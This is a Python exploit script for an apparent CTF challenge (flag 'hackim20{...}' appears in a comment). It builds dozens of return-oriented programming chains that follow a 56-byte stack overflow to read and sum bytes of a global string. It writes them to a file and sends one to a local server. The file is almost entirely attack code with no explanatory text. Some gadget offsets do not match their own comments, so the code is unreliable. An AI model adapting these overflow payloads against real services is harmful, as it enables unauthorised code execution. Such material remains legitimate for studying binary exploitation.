import struct
import subprocess
import socket

def p64(x):
    return struct.pack('<Q', x)

def u64(x):
    return struct.unpack('<Q', x)[0]

SERVER = ('127.0.0.1', 2323)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER)

# ----------------------------------------------------

bss_string = 0x4040a0
call_exit = 0x4011ff

mov_rdi_deref_rdi = 0x00000000004011d6
mov_rsi_deref_rsi = 0x00000000004011db
mov_rdx_deref_rdx = 0x00000000004011e0
mov_rcx_deref_rcx = 0x00000000004011e5

pop_rax = 0x00000000004011a2
pop_rdi = 0x000000000040119a
pop_rsi = 0x000000000040119c
pop_rdx = 0x000000000040119e
pop_rcx = 0x00000000004011a0

add_rax_1 = 0x00000000004011b8
add_rax_rax = 0x00000000004011b4
add_rax_rdi = 0x00000000004011a4
add_rax_rsi = 0x00000000004011a8
add_rax_rdx = 0x00000000004011ac
add_rax_rcx = 0x00000000004011b0

sub_rax_1 = 0x00000000004011d1
sub_rax_rdi = 0x00000000004011c1
sub_rax_rsi = 0x00000000004011c5
sub_rax_rdx = 0x00000000004011c9
sub_rax_rcx = 0x00000000004011cd

xor_rax_rax = 0x00000000004011bd

mov_rdi_rax = 0x00000000004011ea
mov_rsi_rax = 0x00000000004011ee
mov_rdx_rax = 0x00000000004011f2
mov_rcx_rax = 0x00000000004011f6

# ----------------------------------------------------
def a():
    # bv[0] + bv[2] + bv[4] - 100 == 208
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(0)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(2)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(4)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(add_rax_rdx)

    buf += p64(pop_rdi)
    buf += p64(100)
    buf += p64(sub_rax_rdi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def b():
    # bv[6] + bv[8] + bv[10] == 225
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(6)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(8)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(10)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(add_rax_rdx)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def c():
    # bv[12] + bv[14] + bv[16] == 237
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(12)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(14)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(16)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(add_rax_rdx)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def d():
    # bv[18] + bv[1] - bv[30] == 20
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(18)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(1)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(30)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)

    buf += p64(sub_rax_rdx)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def e():
    # bv[3] + bv[22] + bv[3] - 100 == 214
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(3)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(22)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(3)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(add_rax_rdx)

    buf += p64(pop_rdi)
    buf += p64(100)

    buf += p64(sub_rax_rdi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def f():
    # bv[5] + bv[29] + bv[28] - bv[7] - 100 == 183
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(5)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(29)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(28)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rcx)
    buf += p64(7)
    buf += p64(add_rax_rcx)
    buf += p64(mov_rcx_rax)
    buf += p64(mov_rcx_deref_rcx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(add_rax_rdx)
    buf += p64(sub_rax_rcx)

    buf += p64(pop_rdi)
    buf += p64(100)

    buf += p64(sub_rax_rdi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def g():
    # bv[9] + bv[17] - bv[11] == 79)
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(9)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(17)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(11)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(sub_rax_rdx)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def h():
    # bv[13] + bv[15] - bv[19] + bv[20] - bv[27] == 105
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(19)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(27)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rcx_rax)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(13)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(15)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(20)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(add_rax_rdx)
    buf += p64(sub_rax_rcx)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def i():
    # bv[21] + bv[23] + bv[24] == 207
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(21)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(23)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(23)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(add_rax_rdx)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def j():
    # bv[25] + bv[26] == 217
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(25)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(26)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def k():
    # bv[30] == 125
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(30)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def l():
    # bv[9] == 66
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(9)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def m():
    # bv[8] == 123
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(8)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def n():
    # bv[0] == 104
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def o():
    # bv[1] == 97
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(1)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def p():
    # bv[2] == 99
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(2)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def q():
    # bv[3] == 107
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(3)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def r():
    # bv[4] == 105
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(4)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def s():
    # bv[5] == 109
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(5)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def t():
    # bv[6] == 50
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(6)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def u():
    # bv[7] == 48
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(7)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def v():
    # bv[11] + bv[0] == 202
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(11)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(0)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def w():
    # bv[29] == 111
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(29)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def x():
    # bv[28] == 111
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(29)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def y():
    # bv[29] - bv[13] == 29
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(29)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(13)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(sub_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def z():
    # bv[28] - bv[14] == 63
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(28)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(14)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(sub_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def aa():
    # bv[28] + bv[15] == 223
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(28)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(15)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def ab():
    # bv[0] - bv[27] == 36
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(0)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(27)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(sub_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def ac():
    # bv[23] - bv[24] == 0
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(23)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(24)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(sub_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def ad():
    # bv[26] + bv[0] - bv[1] == 124
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(26)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(0)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdx)
    buf += p64(1)
    buf += p64(add_rax_rdx)
    buf += p64(mov_rdx_rax)
    buf += p64(mov_rdx_deref_rdx)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)
    buf += p64(sub_rax_rdx)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def ae():
    # bv[19] == 100
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(19)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)
    buf += p64(call_exit)

    return buf

def af():
    # bv[11] + bv[12] == 219
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(11)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(12)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(add_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

def ag():
    # bv[21] - bv[20] == 32
    buf = b'a' * 56
    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rdi)
    buf += p64(21)
    buf += p64(add_rax_rdi)
    buf += p64(mov_rdi_rax)
    buf += p64(mov_rdi_deref_rdi)

    buf += p64(pop_rax)
    buf += p64(bss_string)
    buf += p64(pop_rsi)
    buf += p64(20)
    buf += p64(add_rax_rsi)
    buf += p64(mov_rsi_rax)
    buf += p64(mov_rsi_deref_rsi)

    buf += p64(xor_rax_rax)
    buf += p64(add_rax_rdi)
    buf += p64(sub_rax_rsi)

    buf += p64(mov_rdi_rax)
    buf += p64(call_exit)

    return buf

funcs = [a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, aa, ab, ac, ad, ae, af, ag]
for func in funcs:
    print(len(func()))

with open('blob', 'wb') as blob_f:
    for func in funcs:
        blob_f.write(func())

# sock.send(b'hackim20{B4byR0pDo0dOod00duDoo}\n')
input('...')
sock.send(a())
input('...')